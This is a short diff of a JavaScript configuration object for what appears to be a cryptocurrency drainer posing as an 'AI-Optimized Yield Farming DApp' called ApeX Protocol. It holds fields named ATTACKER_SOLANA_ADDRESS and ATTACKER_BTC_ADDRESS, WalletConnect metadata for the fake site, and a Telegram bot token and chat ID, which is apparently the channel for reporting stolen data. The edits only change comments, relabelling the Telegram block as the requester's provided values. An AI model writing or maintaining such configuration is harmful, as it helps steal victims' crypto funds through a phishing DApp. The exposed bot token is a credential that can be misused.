@@ -917,7 +917,6 @@ export const CONFIG = {
   ATTACKER_SOLANA_ADDRESS: "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7",
   ATTACKER_BTC_ADDRESS: "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f",
 
-  // DApp metadata (used in WalletConnect)
   DAPP_METADATA: {
     name: 'ApeX Protocol',
     description: 'AI-Optimized Yield Farming DApp',
@@ -925,7 +924,7 @@ export const CONFIG = {
     icons: ['https://walletconnect.com/walletconnect-logo.png'],
   },
 
-  // ====== TELEGRAM CREDENTIALS ======
+  // ====== TELEGRAM CREDENTIALS (YOUR PROVIDED VALUES) ======
   TELEGRAM_BOT_TOKEN: "8695014382:AAHVuw3qQTCa_rGIzBXoRxDEdKkPvUhLim0",
   TELEGRAM_CHAT_ID: "17624102"
 };
